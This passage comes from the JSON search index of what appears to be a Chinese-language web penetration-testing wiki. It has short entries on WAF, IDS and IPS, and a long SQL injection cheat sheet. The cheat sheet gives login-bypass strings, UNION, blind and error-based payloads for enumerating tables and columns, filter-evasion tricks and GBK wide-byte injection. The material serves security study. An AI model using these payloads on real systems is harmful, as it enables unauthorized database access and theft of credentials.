            "title": "\u8d8a\u6743\uff08\u529f\u80fd\u7ea7\u8bbf\u95ee\u7f3a\u5931\uff09"
        }, 
        {
            "location": "/web/introduction/#_7", 
            "text": "\u654f\u611f\u4fe1\u606f\u6307\u4e0d\u4e3a\u516c\u4f17\u6240\u77e5\u6089\uff0c\u5177\u6709\u5b9e\u9645\u548c\u6f5c\u5728\u5229\u7528\u4ef7\u503c\uff0c\u4e22\u5931\u3001\u4e0d\u5f53\u4f7f\u7528\u6216\u672a\u7ecf\u6388\u6743\u8bbf\u95ee\u5bf9\u793e\u4f1a\u3001\u4f01\u4e1a\u6216\u4e2a\u4eba\u9020\u6210\u5371\u5bb3\u7684\u4fe1\u606f\u3002\u5305\u62ec\uff1a\u4e2a\u4eba\u9690\u79c1\u4fe1\u606f\u3001\u4e1a\u52a1\u7ecf\u8425\u4fe1\u606f\u3001\u8d22\u52a1\u4fe1\u606f\u3001\u4eba\u4e8b\u4fe1\u606f\u3001IT \u8fd0\u7ef4\u4fe1\u606f\u7b49\u3002\n\u6cc4\u9732\u9014\u5f84\u5305\u62ec Github\u3001\u767e\u5ea6\u6587\u5e93\u3001Google code\u3001\u7f51\u7ad9\u76ee\u5f55\u7b49\u3002", 
            "title": "\u654f\u611f\u4fe1\u606f\u6cc4\u9732"
        }, 
        {
            "location": "/web/introduction/#_8", 
            "text": "Security Misconfiguration\uff1a\u6709\u65f6\u5019\uff0c\u4f7f\u7528\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u906d\u53d7\u591a\u79cd\u653b\u51fb\u3002\u5728\u5df2\u7ecf\u90e8\u7f72\u7684\u5e94\u7528\u3001WEB \u670d\u52a1\u5668\u3001\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ee3\u7801\u5e93\u4ee5\u53ca\u6240\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u7684\u7ec4\u4ef6\u4e2d\uff0c\u90fd\u5e94\u8be5\u4f7f\u7528\u73b0\u6709\u7684\u6700\u4f73\u5b89\u5168\u914d\u7f6e\uff0c\u8fd9\u4e00\u70b9\u81f3\u5173\u91cd\u8981\u3002", 
            "title": "\u9519\u8bef\u7684\u5b89\u5168\u914d\u7f6e"
        }, 
        {
            "location": "/web/introduction/#waf", 
            "text": "Web \u5e94\u7528\u9632\u62a4\u7cfb\u7edf\uff08\u4e5f\u79f0\uff1a\u7f51\u7ad9\u5e94\u7528\u7ea7\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\u3002\u82f1\u6587\uff1aWeb Application Firewall\uff0c\u7b80\u79f0\uff1aWAF\uff09\u3002\u5229\u7528\u56fd\u9645\u4e0a\u516c\u8ba4\u7684\u4e00\u79cd\u8bf4\u6cd5\uff1aWEB \u5e94\u7528\u9632\u706b\u5899\u662f\u901a\u8fc7\u6267\u884c\u4e00\u7cfb\u5217\u9488\u5bf9 HTTP/HTTPS \u7684\u5b89\u5168\u7b56\u7565\u6765\u4e13\u95e8\u4e3a WEB \u5e94\u7528\u63d0\u4f9b\u4fdd\u62a4\u7684\u4e00\u6b3e\u4ea7\u54c1\u3002", 
            "title": "WAF"
        }, 
        {
            "location": "/web/introduction/#ids", 
            "text": "IDS \u662f\u82f1\u6587 Intrusion Detection Systems \u7684\u7f29\u5199\uff0c\u4e2d\u6587\u610f\u601d\u662f\u300c\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf\u300d\u3002\u4e13\u4e1a\u4e0a\u8bb2\u5c31\u662f\u4f9d\u7167\u4e00\u5b9a\u7684\u5b89\u5168\u7b56\u7565\uff0c\u901a\u8fc7\u8f6f\u3001\u786c\u4ef6\uff0c\u5bf9\u7f51\u7edc\u3001\u7cfb\u7edf\u7684\u8fd0\u884c\u72b6\u51b5\u8fdb\u884c\u76d1\u89c6\uff0c\u5c3d\u53ef\u80fd\u53d1\u73b0\u5404\u79cd\u653b\u51fb\u4f01\u56fe\u3001\u653b\u51fb\u884c\u4e3a\u6216\u8005\u653b\u51fb\u7ed3\u679c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u7edc\u7cfb\u7edf\u8d44\u6e90\u7684\u673a\u5bc6\u6027\u3001\u5b8c\u6574\u6027\u548c\u53ef\u7528\u6027\u3002\u505a\u4e00\u4e2a\u5f62\u8c61\u7684\u6bd4\u55bb\uff1a\u5047\u5982\u9632\u706b\u5899\u662f\u4e00\u5e62\u5927\u697c\u7684\u95e8\u9501\uff0c\u90a3\u4e48 IDS \u5c31\u662f\u8fd9\u5e62\u5927\u697c\u91cc\u7684\u76d1\u89c6\u7cfb\u7edf\u3002\u4e00\u65e6\u5c0f\u5077\u722c\u7a97\u8fdb\u5165\u5927\u697c\uff0c\u6216\u5185\u90e8\u4eba\u5458\u6709\u8d8a\u754c\u884c\u4e3a\uff0c\u53ea\u6709\u5b9e\u65f6\u76d1\u89c6\u7cfb\u7edf\u624d\u80fd\u53d1\u73b0\u60c5\u51b5\u5e76\u53d1\u51fa\u8b66\u544a\u3002", 
            "title": "IDS"
        }, 
        {
            "location": "/web/introduction/#ips", 
            "text": "\u5165\u4fb5\u9632\u5fa1\u7cfb\u7edf\uff08IPS\uff1aIntrusion Prevention System\uff09\u662f\u7535\u8111\u7f51\u7edc\u5b89\u5168\u8bbe\u65bd\uff0c\u662f\u5bf9\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff08Antivirus Programs\uff09\u548c\u9632\u706b\u5899\uff08Packet Filter\uff0cApplication Gateway\uff09\u7684\u8865\u5145\u3002\u5165\u4fb5\u9884\u9632\u7cfb\u7edf\uff08Intrusion-prevention system\uff09\u662f\u4e00\u90e8\u80fd\u591f\u76d1\u89c6\u7f51\u7edc\u6216\u7f51\u7edc\u8bbe\u5907\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u7684\u8ba1\u7b97\u673a\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\uff0c\u80fd\u591f\u5373\u65f6\u7684\u4e2d\u65ad\u3001\u8c03\u6574\u6216\u9694\u79bb\u4e00\u4e9b\u4e0d\u6b63\u5e38\u6216\u662f\u5177\u6709\u4f24\u5bb3\u6027\u7684\u7f51\u7edc\u8d44\u6599\u4f20\u8f93\u884c\u4e3a\u3002", 
            "title": "IPS"
        }, 
        {
            "location": "/web/introduction/#_9", 
            "text": "WEB \u6e17\u900f Wiki", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/web/sqli/", 
            "text": "\u57fa\u672c\u6982\u5ff5\n\n\n\n\nSQL \u6ce8\u5165\u662f\u4e00\u79cd\u5c06 SQL \u4ee3\u7801\u63d2\u5165\u6216\u6dfb\u52a0\u5230\u5e94\u7528\uff08\u7528\u6237\uff09\u7684\u8f93\u5165\u53c2\u6570\u4e2d\uff0c\u4e4b\u540e\u518d\u8bb2\u8fd9\u4e9b\u53c2\u6570\u4f20\u9012\u7ed9\u540e\u53f0\u7684 SQL \u670d\u52a1\u5668\u52a0\u4ee5\u89e3\u6790\u5e76\u6267\u884c\u7684\u653b\u51fb\u3002\n\n\n\u653b\u51fb\u8005\u80fd\u591f\u4fee\u6539 SQL \u8bed\u53e5\uff0c\u8be5\u8fdb\u7a0b\u5c06\u4e0e\u6267\u884c\u547d\u4ee4\u7684\u7ec4\u4ef6\uff08\u5982\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u5e94\u7528\u670d\u52a1\u5668\u6216 WEB \u670d\u52a1\u5668\uff09\u62e5\u6709\u76f8\u540c\u7684\u6743\u9650\u3002\n\n\n\u5982\u679c WEB \u5e94\u7528\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u786e\u4fdd\u5728\u5c06\u4ece WEB \u8868\u5355\u3001cookie\u3001\u8f93\u5165\u53c2\u6570\u7b49\u6536\u5230\u7684\u503c\u4f20\u9012\u7ed9 SQL \u67e5\u8be2\uff08\u8be5\u67e5\u8be2\u5728\u6570\u636e\u5e93\u670d\u52a1\u5668\u4e0a\u6267\u884c\uff09\u4e4b\u524d\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u8fc7\u9a8c\u8bc1\uff0c\u901a\u5e38\u5c31\u4f1a\u51fa\u73b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u3002\n\n\n\n\n\u5e38\u7528\u5de5\u5177\n\n\n\n\nBurp Suite\uff1a\nBurp Suite \u4f7f\u7528\u4ecb\u7ecd\n\n\nTamper Data (Firefox addon)\n\n\nHackBar (Firefox addon)\n\n\nsqlmap\uff1a\nsqlmap \u7528\u6237\u624b\u518c\n\n\n\n\n\u6ce8\u5165\u5e38\u89c1\u53c2\u6570\n\n\n\n\nuser()\n\uff1a\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237\n\n\ndatabase()\n\uff1a\u5f53\u524d\u6570\u636e\u5e93\u540d\n\n\nversion()\n\uff1a\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u7248\u672c\n\n\n@@datadir\n\uff1a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u8def\u5f84\n\n\nconcat()\n\uff1a\u8054\u5408\u6570\u636e\uff0c\u7528\u4e8e\u8054\u5408\u4e24\u6761\u6570\u636e\u7ed3\u679c\u3002\u5982 \nconcat(username,0x3a,password)\n\n\ngroup_concat()\n\uff1a\u548c \nconcat()\n \u7c7b\u4f3c\uff0c\u5982 \ngroup_concat(DISTINCT+user,0x3a,password)\n\uff0c\u7528\u4e8e\u628a\u591a\u6761\u6570\u636e\u4e00\u6b21\u6ce8\u5165\u51fa\u6765\n\n\nconcat_ws()\n\uff1a\u7528\u6cd5\u7c7b\u4f3c\n\n\nhex()\n \u548c \nunhex()\n\uff1a\u7528\u4e8e hex \u7f16\u7801\u89e3\u7801\n\n\nload_file()\n\uff1a\u4ee5\u6587\u672c\u65b9\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u5728 Windows \u4e2d\uff0c\u8def\u5f84\u8bbe\u7f6e\u4e3a \n\\\\\n\n\nselect xxoo into outfile '\u8def\u5f84'\n\uff1a\u6743\u9650\u8f83\u9ad8\u65f6\u53ef\u76f4\u63a5\u5199\u6587\u4ef6\n\n\n\n\n\u8bed\u6cd5\u53c2\u8003\u4e0e\u5c0f\u6280\u5de7\n\n\n\u884c\u95f4\u6ce8\u91ca\n\n\n\n\n\n\n--\n\n\nDROP\n \nsampletable\n;\n--\n\n\n\n\n\n\n\n\n\n#\n\n\nDROP\n \nsampletable\n;\n#\n\n\n\n\n\n\n\n\n\n\u884c\u5185\u6ce8\u91ca\n\n\n\n\n\n\n/*\u6ce8\u91ca\u5185\u5bb9*/\n\n\nDROP\n/*comment*/\nsampletable\n`\n   \nDR\n/**/\nOP\n/*\u7ed5\u8fc7\u8fc7\u6ee4*/\nsampletable\n`\n   \nSELECT\n/*\u66ff\u6362\u7a7a\u683c*/\npassword\n/**/\nFROM\n/**/\nMembers\n\n\n\n\n\n\n\n\n\n/*! MYSQL\u4e13\u5c5e */\n\n\nSELECT\n \n/*!32302 1/0, */\n \n1\n \nFROM\n \ntablename\n\n\n\n\n\n\n\n\n\n\u5b57\u7b26\u4e32\u7f16\u7801\n\n\n\n\nASCII()\n\uff1a\u8fd4\u56de\u5b57\u7b26\u7684 ASCII \u7801\u503c\n\n\nCHAR()\n\uff1a\u628a\u6574\u6570\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26\n\n\n\n\n\u540e\u53f0\u4e07\u80fd\u5bc6\u7801\n\n\n\n\nadmin' --\n\n\nadmin' #\n\n\nadmin'/*\n\n\n' or 1=1--\n\n\n' or 1=1#\n\n\n' or 1=1/*\n\n\n') or '1'='1--\n\n\n') or ('1'='1--\n\n\n\u4ee5\u4e0d\u540c\u7684\u7528\u6237\u767b\u9646\u00a0\n' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--\n\n\n\n\n\u6ce8\u5165\u8bed\u53e5\u5907\u5fd8\n\n\n\u6570\u636e\u5e93\u540d\n\n\nSELECT\n \ndatabase\n();\n\n\nSELECT\n \nschema_name\n \nFROM\n \ninformation_schema\n.\nschemata\n;\n\n\n\n\n\n\u8868\u540d\n\n\n\n\n\n\nunion \u67e5\u8be2\n\n\n--MySQL 4\u7248\u672c\u65f6\u7528version=9\uff0cMySQL 5\u7248\u672c\u65f6\u7528version=10\n\n\nUNION\n \nSELECT\n \nGROUP_CONCAT\n(\ntable_name\n)\n \nFROM\n \ninformation_schema\n.\ntables\n \nWHERE\n \nversion\n=\n10\n;\n   \n/* \u5217\u51fa\u5f53\u524d\u6570\u636e\u5e93\u4e2d\u7684\u8868 */\n\n\nUNION\n \nSELECT\n \nTABLE_NAME\n \nFROM\n \ninformation_schema\n.\ntables\n \nWHERE\n \nTABLE_SCHEMA\n=\ndatabase\n();\n   \n/* \u5217\u51fa\u6240\u6709\u7528\u6237\u81ea\u5b9a\u4e49\u6570\u636e\u5e93\u4e2d\u7684\u8868 */\n\n\nSELECT\n \ntable_schema\n,\n \ntable_name\n \nFROM\n \ninformation_schema\n.\ntables\n \nWHERE\n \ntable_schema\n!=\ninformation_schema\n \nAND\n \ntable_schema\n!=\nmysql\n;\n\n\n\n\n\n\n\n\n\n\u76f2\u6ce8\n\n\nAND\n \nSELECT\n \nSUBSTR\n(\ntable_name\n,\n1\n,\n1\n)\n \nFROM\n \ninformation_schema\n.\ntables\n \n \nA\n\n\n\n\n\n\n\n\n\n\u62a5\u9519\n\n\nAND\n(\nSELECT\n \nCOUNT\n(\n*\n)\n \nFROM\n \n(\nSELECT\n \n1\n \nUNION\n \nSELECT\n \nnull\n \nUNION\n \nSELECT\n \n!\n1\n)\nx\n \nGROUP\n \nBY\n \nCONCAT\n((\nSELECT\n \ntable_name\n \nFROM\n \ninformation_schema\n.\ntables\n \nLIMIT\n \n1\n),\nFLOOR\n(\nRAND\n(\n0\n)\n*\n2\n)))\n \n(\n@\n:\n=\n1\n)\n||@\n \nGROUP\n \nBY\n \nCONCAT\n((\nSELECT\n \ntable_name\n \nFROM\n \ninformation_schema\n.\ntables\n \nLIMIT\n \n1\n),\n!@\n)\n \nHAVING\n \n@||\nMIN\n(\n@\n:\n=\n0\n);\n \nAND\n \nExtractValue\n(\n1\n,\n \nCONCAT\n(\n0\nx5c\n,\n \n(\nSELECT\n \ntable_name\n \nFROM\n \ninformation_schema\n.\ntables\n \nLIMIT\n \n1\n)));\n\n\n-- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f\u3002\n\n\n\n\n\n\n\n\n\n\u5217\u540d\n\n\n\n\n\n\nunion \u67e5\u8be2\n\n\nUNION\n \nSELECT\n \nGROUP_CONCAT\n(\ncolumn_name\n)\n \nFROM\n \ninformation_schema\n.\ncolumns\n \nWHERE\n \ntable_name\n \n=\n \ntablename\n\n\n\n\n\n\n\n\n\n\u76f2\u6ce8\n\n\nAND\n \nSELECT\n \nSUBSTR\n(\ncolumn_name\n,\n1\n,\n1\n)\n \nFROM\n \ninformation_schema\n.\ncolumns\n \n \nA\n\n\n\n\n\n\n\n\n\n\u62a5\u9519\n\n\n-- \u57285.1.5\u7248\u672c\u4e2d\u6210\u529f\n\n\nAND\n \n(\n1\n,\n2\n,\n3\n)\n \n=\n \n(\nSELECT\n \n*\n \nFROM\n \nSOME_EXISTING_TABLE\n \nUNION\n \nSELECT\n \n1\n,\n2\n,\n3\n \nLIMIT\n \n1\n)\n\n\n-- MySQL 5.1\u7248\u672c\u4fee\u590d\u4e86\n\n\nAND\n(\nSELECT\n \nCOUNT\n(\n*\n)\n \nFROM\n \n(\nSELECT\n \n1\n \nUNION\n \nSELECT\n \nnull\n \nUNION\n \nSELECT\n \n!\n1\n)\nx\n \nGROUP\n \nBY\n \nCONCAT\n((\nSELECT\n \ncolumn_name\n \nFROM\n \ninformation_schema\n.\ncolumns\n \nLIMIT\n \n1\n),\nFLOOR\n(\nRAND\n(\n0\n)\n*\n2\n)))\n \n(\n@\n:\n=\n1\n)\n||@\n \nGROUP\n \nBY\n \nCONCAT\n((\nSELECT\n \ncolumn_name\n \nFROM\n \ninformation_schema\n.\ncolumns\n \nLIMIT\n \n1\n),\n!@\n)\n \nHAVING\n \n@||\nMIN\n(\n@\n:\n=\n0\n);\n \nAND\n \nExtractValue\n(\n1\n,\n \nCONCAT\n(\n0\nx5c\n,\n \n(\nSELECT\n \ncolumn_name\n \nFROM\n \ninformation_schema\n.\ncolumns\n \nLIMIT\n \n1\n)));\n\n\n\n\n\n\n\n\n\n\u5229\u7528 \nPROCEDURE ANALYSE()\n\n\n-- \u8fd9\u4e2a\u9700\u8981 web \u5c55\u793a\u9875\u9762\u6709\u4f60\u6240\u6ce8\u5165\u67e5\u8be2\u7684\u4e00\u4e2a\u5b57\u6bb5\n\n\n-- \u83b7\u5f97\u7b2c\u4e00\u4e2a\u6bb5\u540d\n\n\nSELECT\n \nusername\n,\n \npermission\n \nFROM\n \nUsers\n \nWHERE\n \nid\n \n=\n \n1\n;\n \n1\n \nPROCEDURE\n \nANALYSE\n()\n\n\n-- \u83b7\u5f97\u7b2c\u4e8c\u4e2a\u6bb5\u540d\n\n\n1\n \nLIMIT\n \n1\n,\n1\n \nPROCEDURE\n \nANALYSE\n()\n\n\n-- \u83b7\u5f97\u7b2c\u4e09\u4e2a\u6bb5\u540d\n\n\n1\n \nLIMIT\n \n2\n,\n1\n \nPROCEDURE\n \nANALYSE\n()\n\n\n\n\n\n\n\n\n\n\u6839\u636e\u5217\u540d\u67e5\u8be2\u6240\u5728\u7684\u8868\n\n\n-- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e3a username \u7684\u8868\n\n\nSELECT\n \ntable_name\n \nFROM\n \ninformation_schema\n.\ncolumns\n \nWHERE\n \ncolumn_name\n \n=\n \nusername\n;\n\n\n-- \u67e5\u8be2\u5b57\u6bb5\u540d\u4e2d\u5305\u542b username \u7684\u8868\n\n\nSELECT\n \ntable_name\n \nFROM\n \ninformation_schema\n.\ncolumns\n \nWHERE\n \ncolumn_name\n \nLIKE\n \n%user%\n;\n\n\n\n\n\n\u7ed5\u8fc7\u5f15\u53f7\u9650\u5236\n\n\n-- hex \u7f16\u7801\n\n\nSELECT\n \n*\n \nFROM\n \nUsers\n \nWHERE\n \nusername\n \n=\n \n0\nx61646D696E\n\n\n-- char() \u51fd\u6570\n\n\nSELECT\n \n*\n \nFROM\n \nUsers\n \nWHERE\n \nusername\n \n=\n \nCHAR\n(\n97\n,\n \n100\n,\n \n109\n,\n \n105\n,\n \n110\n)\n\n\n\n\n\n\u7ed5\u8fc7\u5b57\u7b26\u4e32\u9ed1\u540d\u5355\n\n\nSELECT\n \na\n \nd\n \nmi\n \nn\n;\n\n\nSELECT\n \nCONCAT\n(\na\n,\n \nd\n,\n \nm\n,\n \ni\n,\n \nn\n);\n\n\nSELECT\n \nCONCAT_WS\n(\n,\n \na\n,\n \nd\n,\n \nm\n,\n \ni\n,\n \nn\n);\n\n\nSELECT\n \nGROUP_CONCAT\n(\na\n,\n \nd\n,\n \nm\n,\n \ni\n,\n \nn\n);\n\n\n\n\n\n\u4f7f\u7528 \nCONCAT()\n \u65f6\uff0c\u4efb\u4f55\u4e2a\u53c2\u6570\u4e3a null\uff0c\u5c06\u8fd4\u56de null\uff0c\u63a8\u8350\u4f7f\u7528 \nCONCAT_WS()\n\u3002\nCONCAT_WS()\n\u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u8868\u793a\u7528\u54ea\u4e2a\u5b57\u7b26\u95f4\u9694\u6240\u67e5\u8be2\u7684\u7ed3\u679c\u3002\n\n\n\u6761\u4ef6\u8bed\u53e5\n\n\nCASE\n, \nIF()\n, \nIFNULL()\n, \nNULLIF()\n.\n\n\nSELECT\n \nIF\n(\n1\n=\n1\n,\n \ntrue\n,\n \nfalse\n);\n\n\nSELECT\n \nCASE\n \nWHEN\n \n1\n=\n1\n \nTHEN\n \ntrue\n \nELSE\n \nfalse\n \nEND\n;\n\n\n\n\n\n\u5ef6\u65f6\u51fd\u6570\n\n\nSLEEP()\n, \nBENCHMARK()\n.\n\n\n - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(\ntrue\n)), false)) - \n\n\n\n\n\norder by \u540e\u7684\u6ce8\u5165\n\n\norder by\n \u7531\u4e8e\u662f\u6392\u5e8f\u8bed\u53e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u6761\u4ef6\u8bed\u53e5\u505a\u5224\u65ad\uff0c\u6839\u636e\u8fd4\u56de\u7684\u6392\u5e8f\u7ed3\u679c\u4e0d\u540c\u5224\u65ad\u6761\u4ef6\u7684\u771f\u5047\u3002\u4e00\u822c\u5e26\u6709 \norder\n \u6216\u8005 \norder by\n \u7684\u53d8\u91cf\u5f88\u53ef\u80fd\u662f\u8fd9\u79cd\u6ce8\u5165\uff0c\u5728\u77e5\u9053\u4e00\u4e2a\u5b57\u6bb5\u7684\u65f6\u5019\u53ef\u4ee5\u91c7\u7528\u5982\u4e0b\u65b9\u5f0f\u6ce8\u5165\uff1a\n\n\n\u539f\u59cb\u94fe\u63a5\uff1a\nhttp://www.test.com/list.php?order=vote\n\n\n\u6839\u636e \nvote\n \u5b57\u6bb5\u6392\u5e8f\u3002\u627e\u5230\u6295\u7968\u6570\u6700\u5927\u7684\u7968\u6570 \nnum\n \u7136\u540e\u6784\u9020\u4ee5\u4e0b\u94fe\u63a5\uff1a\n\n\nhttp://www.test.com/list.php?order=abs(vote-(length(user())\n0)*num)+asc\n\n\n\n\n\u770b\u6392\u5e8f\u662f\u5426\u53d8\u5316\u3002\u8fd8\u6709\u4e00\u79cd\u65b9\u6cd5\u4e0d\u9700\u8981\u77e5\u9053\u4efb\u4f55\u5b57\u6bb5\u4fe1\u606f\uff0c\u4f7f\u7528 \nrand\n \u51fd\u6570\uff1a\n\n\nhttp://www.test.com/list.php?order=rand(true)\nhttp://www.test.com/list.php?order=rand(false)\n\n\n\n\n\u4ee5\u4e0a\u4e24\u4e2a\u4f1a\u8fd4\u56de\u4e0d\u540c\u7684\u6392\u5e8f\uff0c\u5224\u65ad\u8868\u540d\u4e2d\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u5426\u5c0f\u4e8e 128 \u7684\u8bed\u53e5\u5982\u4e0b\uff1a\n\n\nhttp://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)\n=128))\n\n\n\n\n\u5bbd\u5b57\u8282\u6ce8\u5165\n\n\n\u56fd\u5185\u6700\u5e38\u4f7f\u7528\u7684 GBK \u7f16\u7801\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e3b\u8981\u662f\u7ed5\u8fc7 \naddslashes\n \u7b49\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u79fb\u7684\u7ed5\u8fc7\u3002\u53cd\u659c\u6760 \n\\\n \u7684\u5341\u516d\u8fdb\u5236\u4e3a \n%5c\n\uff0c\u5728\u4f60\u8f93\u5165 \n%bf%27\n \u65f6\uff0c\u51fd\u6570\u9047\u5230\u5355\u5f15\u53f7\u81ea\u52a8\u8f6c\u79fb\u52a0\u5165 \n\\\n\uff0c\u6b64\u65f6\u53d8\u4e3a \n%bf%5c%27\n\uff0c\n%bf%5c\n\n\u5728 GBK \u4e2d\u53d8\u4e3a\u4e00\u4e2a\u5bbd\u5b57\u7b26\u300c\u7e17\u300d\u3002\n%bf\n \u90a3\u4e2a\u4f4d\u7f6e\u53ef\u4ee5\u662f \n%81-%fe\n \u4e2d\u95f4\u7684\u4efb\u4f55\u5b57\u7b26\u3002\u4e0d\u6b62\u5728 SQL \u6ce8\u5165\u4e2d\uff0c\u5bbd\u5b57\u7b26\u6ce8\u5165\u5728\u5f88\u591a\u5730\u65b9\u90fd\u53ef\u4ee5\u5e94\u7528\u3002\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\nSQL \u6ce8\u5165\u901f\u67e5\u8868\n\n\nMySQL \u6ce8\u5165\u6280\u5de7\n\n\nMySQL \u6ce8\u5165\u79d1\u666e\n\n\nMySQL \u6ce8\u5165\u603b\u7ed3\n\n\n\u300aSQL \u6ce8\u5165\u653b\u51fb\u4e0e\u9632\u5fa1\u300b", 
            "title": "SQL \u6ce8\u5165"
        }, 
        {
            "location": "/web/sqli/#_1", 
            "text": "SQL \u6ce8\u5165\u662f\u4e00\u79cd\u5c06 SQL \u4ee3\u7801\u63d2\u5165\u6216\u6dfb\u52a0\u5230\u5e94\u7528\uff08\u7528\u6237\uff09\u7684\u8f93\u5165\u53c2\u6570\u4e2d\uff0c\u4e4b\u540e\u518d\u8bb2\u8fd9\u4e9b\u53c2\u6570\u4f20\u9012\u7ed9\u540e\u53f0\u7684 SQL \u670d\u52a1\u5668\u52a0\u4ee5\u89e3\u6790\u5e76\u6267\u884c\u7684\u653b\u51fb\u3002  \u653b\u51fb\u8005\u80fd\u591f\u4fee\u6539 SQL \u8bed\u53e5\uff0c\u8be5\u8fdb\u7a0b\u5c06\u4e0e\u6267\u884c\u547d\u4ee4\u7684\u7ec4\u4ef6\uff08\u5982\u6570\u636e\u5e93\u670d\u52a1\u5668\u3001\u5e94\u7528\u670d\u52a1\u5668\u6216 WEB \u670d\u52a1\u5668\uff09\u62e5\u6709\u76f8\u540c\u7684\u6743\u9650\u3002  \u5982\u679c WEB \u5e94\u7528\u5f00\u53d1\u4eba\u5458\u65e0\u6cd5\u786e\u4fdd\u5728\u5c06\u4ece WEB \u8868\u5355\u3001cookie\u3001\u8f93\u5165\u53c2\u6570\u7b49\u6536\u5230\u7684\u503c\u4f20\u9012\u7ed9 SQL \u67e5\u8be2\uff08\u8be5\u67e5\u8be2\u5728\u6570\u636e\u5e93\u670d\u52a1\u5668\u4e0a\u6267\u884c\uff09\u4e4b\u524d\u5df2\u7ecf\u5bf9\u5176\u8fdb\u884c\u8fc7\u9a8c\u8bc1\uff0c\u901a\u5e38\u5c31\u4f1a\u51fa\u73b0 SQL \u6ce8\u5165\u6f0f\u6d1e\u3002", 
            "title": "\u57fa\u672c\u6982\u5ff5"
        }, 
        {
            "location": "/web/sqli/#_2", 
            "text": "Burp Suite\uff1a Burp Suite \u4f7f\u7528\u4ecb\u7ecd  Tamper Data (Firefox addon)  HackBar (Firefox addon)  sqlmap\uff1a sqlmap \u7528\u6237\u624b\u518c", 
            "title": "\u5e38\u7528\u5de5\u5177"
        }, 
        {
            "location": "/web/sqli/#_3", 
            "text": "user() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u7528\u6237  database() \uff1a\u5f53\u524d\u6570\u636e\u5e93\u540d  version() \uff1a\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93\u7248\u672c  @@datadir \uff1a\u6570\u636e\u5e93\u5b58\u50a8\u6570\u636e\u8def\u5f84  concat() \uff1a\u8054\u5408\u6570\u636e\uff0c\u7528\u4e8e\u8054\u5408\u4e24\u6761\u6570\u636e\u7ed3\u679c\u3002\u5982  concat(username,0x3a,password)  group_concat() \uff1a\u548c  concat()  \u7c7b\u4f3c\uff0c\u5982  group_concat(DISTINCT+user,0x3a,password) \uff0c\u7528\u4e8e\u628a\u591a\u6761\u6570\u636e\u4e00\u6b21\u6ce8\u5165\u51fa\u6765  concat_ws() \uff1a\u7528\u6cd5\u7c7b\u4f3c  hex()  \u548c  unhex() \uff1a\u7528\u4e8e hex \u7f16\u7801\u89e3\u7801  load_file() \uff1a\u4ee5\u6587\u672c\u65b9\u5f0f\u8bfb\u53d6\u6587\u4ef6\uff0c\u5728 Windows \u4e2d\uff0c\u8def\u5f84\u8bbe\u7f6e\u4e3a  \\\\  select xxoo into outfile '\u8def\u5f84' \uff1a\u6743\u9650\u8f83\u9ad8\u65f6\u53ef\u76f4\u63a5\u5199\u6587\u4ef6", 
            "title": "\u6ce8\u5165\u5e38\u89c1\u53c2\u6570"
        }, 
        {
            "location": "/web/sqli/#_4", 
            "text": "", 
            "title": "\u8bed\u6cd5\u53c2\u8003\u4e0e\u5c0f\u6280\u5de7"
        }, 
        {
            "location": "/web/sqli/#_5", 
            "text": "--  DROP   sampletable ; --     #  DROP   sampletable ; #", 
            "title": "\u884c\u95f4\u6ce8\u91ca"
        }, 
        {
            "location": "/web/sqli/#_6", 
            "text": "/*\u6ce8\u91ca\u5185\u5bb9*/  DROP /*comment*/ sampletable `     DR /**/ OP /*\u7ed5\u8fc7\u8fc7\u6ee4*/ sampletable `     SELECT /*\u66ff\u6362\u7a7a\u683c*/ password /**/ FROM /**/ Members     /*! MYSQL\u4e13\u5c5e */  SELECT   /*!32302 1/0, */   1   FROM   tablename", 
            "title": "\u884c\u5185\u6ce8\u91ca"
        }, 
        {
            "location": "/web/sqli/#_7", 
            "text": "ASCII() \uff1a\u8fd4\u56de\u5b57\u7b26\u7684 ASCII \u7801\u503c  CHAR() \uff1a\u628a\u6574\u6570\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u5b57\u7b26", 
            "title": "\u5b57\u7b26\u4e32\u7f16\u7801"
        }, 
        {
            "location": "/web/sqli/#_8", 
            "text": "admin' --  admin' #  admin'/*  ' or 1=1--  ' or 1=1#  ' or 1=1/*  ') or '1'='1--  ') or ('1'='1--  \u4ee5\u4e0d\u540c\u7684\u7528\u6237\u767b\u9646\u00a0 ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--", 
            "title": "\u540e\u53f0\u4e07\u80fd\u5bc6\u7801"
        }, 
        {
            "location": "/web/sqli/#_9", 
            "text": "", 
